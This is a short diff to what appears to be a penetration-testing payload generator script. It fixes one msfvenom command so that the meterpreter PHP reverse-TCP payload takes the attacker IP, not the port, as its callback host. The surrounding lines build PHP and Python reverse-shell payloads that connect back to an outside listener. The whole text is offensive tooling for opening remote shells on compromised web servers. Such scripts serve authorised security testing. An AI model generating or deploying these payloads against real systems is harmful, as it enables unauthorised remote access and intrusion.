@@ -9,7 +9,7 @@ banner "payloads_common: shell_reverse_tcp.php"
 msfvenom -p php/reverse_php LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_tcp.php
 
 banner "payloads_common: meterpreter_reverse_tcp.php"
-msfvenom -p php/meterpreter_reverse_tcp LHOST=$source_port LPORT=$source_port -f raw > meterpreter_reverse_tcp.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$source_ip LPORT=$source_port -f raw > meterpreter_reverse_tcp.php
 
 banner "payloads_common: shell_reverse_unix.py"
 msfvenom -p cmd/unix/reverse_python LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_unix.py
